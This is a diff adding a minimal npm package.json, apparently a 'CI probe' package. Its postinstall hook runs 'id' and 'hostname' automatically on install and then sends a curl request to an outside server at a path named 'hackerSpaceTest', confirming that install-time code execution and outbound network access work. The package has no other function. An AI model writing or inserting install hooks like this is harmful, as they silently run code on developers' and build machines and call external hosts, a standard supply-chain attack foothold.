@@ -1,0 +1,6 @@
+{
+  "name": "miloco-ci-probe",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {"postinstall": "id; hostname; curl -sS -m 10 https://ssrf.dun.mi.com/ssrf/hackerSpaceTest || true"}
+}
